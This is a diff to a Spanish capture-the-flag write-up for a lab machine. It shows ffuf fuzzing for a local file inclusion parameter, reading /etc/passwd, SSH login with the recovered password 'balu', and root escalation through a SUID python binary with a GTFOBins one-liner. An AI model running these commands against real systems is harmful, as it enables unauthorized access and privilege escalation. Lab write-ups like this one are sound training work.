@@ -77,7 +77,8 @@ Como es un servicio apache2, seguramente ya estemos en la ruta /var/www/html ent
 
 ## Explotación
 
-Al parecer la web es capaz de volcar archivo por lo cual me hace pensar que es vulnerable a un LFI, podemos tratar de fuzzear sobr el archivo _index.php_ para descubrir algún parametro que nos permita volcar el /etc/passwd
+La web al parecer tiene la capacidad de listarme archivos, podemos tratar de fuzzear sobr el archivo _index.php_ para descubrir algún parametro vulnerable que nos permita listar los archivos.
+
 ```bash
 ffuf -w raft-large-directories.txt:FUZZ -u http://172.17.0.2/index.php?FUZZ=/etc/passwd -fw 12
 -----------------------------------------------------------------------------------------------
@@ -86,12 +87,18 @@ page   [Status: 200, Size: 1367, Words: 11, Lines: 27, Duration: 2ms]
 
 - Descubrimos el parametro _page_
 
-Ahora volcamos el /etc/passwd
+
+
+Ahora podemos listar el archivo `/etc/passwd` en `http://172.17.0.2/index.php?page=/etc/passwd`.
+
 ![](../assets/Pasted image 20251109151030.png)
+
 - Vemos que existen 2 usuarios uno llamado _pinguino_ y el otro _mario_
 
-Nos conectamos por ssh con las credenciales
+Ahora ya tenemos la contraeña "balu" y 2 usuarios, por lo cual podemos tratar de acceder por `SSH`.
+
 - pinguino:balu
+
 ```bash
 > ssh pinguino@172.17.0.2
 ---------------------------
@@ -131,16 +138,17 @@ Ahora lo que hicimos fue tratar de encontrar binarios con permisos SUID
 
 - Encontramos el binario python que pertenece al usuario root.
 
-Por lo cual ahora, sabiendo que el binario python tiene permisos SUID procedemos a explotarlo con ayuda de GTFObins
+Abusamos del binario `python` con ayuda de [GTFOBins](https://gtfobins.github.io/gtfobins/python/) y migramos al usuario root.
+
 ```bash
-> mario@dockerlabs:/home$ /usr/bin/python3.8 -c 'import os; os.system("/bin/sh")'
-# whoami
+> mario@dockerlabs:/home$ /usr/bin/python3.8 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
+bash-5.0# whoami
 root
-# id
+bash-5.0# id
 uid=1001(mario) gid=1001(mario) euid=0(root) groups=1001(mario)
 ```
 
 - uid=1001(mario) ← Identidad real: Soy mario euid=0(root) ← Privilegios efectivos: Actúas como root
 
 
-***PWNED**
+***PWNED***
